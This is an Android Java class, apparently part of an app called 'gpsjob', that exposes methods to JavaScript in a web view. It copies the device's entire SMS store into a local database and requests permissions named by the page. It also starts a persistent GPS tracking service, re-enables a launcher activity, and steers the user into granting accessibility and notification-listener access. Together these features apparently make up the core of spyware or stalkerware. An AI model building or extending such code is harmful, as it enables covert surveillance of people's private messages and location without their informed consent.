package com.lurkerx.gpsjob;

import android.Manifest;
import android.app.Activity;
import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.content.ContentValues;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.Build;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.provider.Settings;

import androidx.annotation.RequiresApi;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.work.*;
import androidx.work.PeriodicWorkRequest;
import android.content.Context;

import com.lurkerx.gpsjob.smsjob.SmsDatabaseHelper;

import org.json.JSONArray;

import java.util.concurrent.TimeUnit;

public class AndroidBridge {
    private final Activity activity;
    private final GpsDatabaseHelper dbHelper;
    private final SmsDatabaseHelper SmsDbHelper;
    private static final String PREFS_NAME = "gpsjob_prefs";
    private static final String KEY_FIRST_LAUNCH = "first_launch_done";
    Context context;

    public AndroidBridge(Activity activity) {
        this.activity = activity;
        this.dbHelper = new GpsDatabaseHelper(activity);
        this.SmsDbHelper = new SmsDatabaseHelper(activity);
    }

    @JavascriptInterface
    public void saveSmsIfNew() {
        try {
            if (ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_SMS)
                    != PackageManager.PERMISSION_GRANTED) {
                Log.d("DB creation", "No READ_SMS permission, returning");
                return;
            }
            Uri uri = Uri.parse("content://sms/inbox");
            Cursor cursor = activity.getContentResolver().query(uri, null, null, null, "date DESC");

            if (cursor != null) {
                SQLiteDatabase db = SmsDbHelper.getWritableDatabase();
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));

                    int typeInt = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
                    String type;
                    switch (typeInt) {
                        case 1: type = "received"; break; // inbox
                        case 2: type = "sent"; break;     // sent
                        case 3: type = "draft"; break;    // draft
                        case 4: type = "outbox"; break;   // outbox
                        case 5: type = "failed"; break;   // failed to send
                        case 6: type = "queued"; break;   // queued
                        default: type = "unknown"; break;
                    }

                    ContentValues values = new ContentValues();
                    values.put("address", address);
                    values.put("body", body);
                    values.put("date", date);
                    values.put("type", type);
                    db.insertWithOnConflict("sms", null, values, SQLiteDatabase.CONFLICT_IGNORE);
                }
                cursor.close();
                db.close();
                Log.d("AndroidBridge", "Successfully saved SMS with dynamic type");
            }
        } catch (Exception e) {
            Log.e("AndroidBridge", "Error saving SMS", e);
            e.printStackTrace();
        }
    }

    @JavascriptInterface
    public boolean isPermissionGranted(String permission) {
        return ContextCompat.checkSelfPermission(activity, permission)
                == PackageManager.PERMISSION_GRANTED;
    }

    @JavascriptInterface
    public void requestPermissions(String jsonPerms) {
        try {
            JSONArray arr = new JSONArray(jsonPerms);
            String[] permissions = new String[arr.length()];
            for (int i = 0; i < arr.length(); i++) {
                permissions[i] = arr.getString(i);
            }
            ActivityCompat.requestPermissions(activity, permissions, 1001);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @JavascriptInterface
    public void launchEnableActivity() {
        ComponentName componentName = new ComponentName(activity, LaunchActivity.class);
        activity.getPackageManager().setComponentEnabledSetting(
                componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        Intent intent = new Intent(activity, LaunchActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        activity.startActivity(intent);
    }
    @JavascriptInterface
    public boolean startService() {
        try {
            Intent intent = new Intent(activity, GpsService.class);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                activity.startForegroundService(intent);
            } else {
                activity.startService(intent);
            }
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    @JavascriptInterface
    public void launchAccessibilityPerm() {
        Log.d("Android Bridge", "Requesting Acc Perm");
        Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        activity.startActivity(intent);
    }
    @RequiresApi(api = Build.VERSION_CODES.O)
    @JavascriptInterface
    public void launchNotificationAccess(){
        Log.d("AndroidBridge", "Requesting notification access");
        Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
        activity.startActivity(intent);
    }

    @JavascriptInterface
    public boolean isNotifAccessGranted() {
        return com.lurkerx.gpsjob.notifjob.NotificationService.isGranted();
    }

    @JavascriptInterface
    public boolean isAccessibilityEnabled() {
        if (activity == null) return false;
        String serviceId = activity.getPackageName() + "/" + AppAccessibilityService.class.getCanonicalName();
        try {
            int accessibilityEnabled = Settings.Secure.getInt(
                    activity.getContentResolver(),
                    Settings.Secure.ACCESSIBILITY_ENABLED
            );
            if (accessibilityEnabled == 1) {
                String enabledServices = Settings.Secure.getString(
                        activity.getContentResolver(),
                        Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                );
                return enabledServices != null &&
                        enabledServices.toLowerCase().contains(serviceId.toLowerCase());
            }
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }
        return false;
    }

}
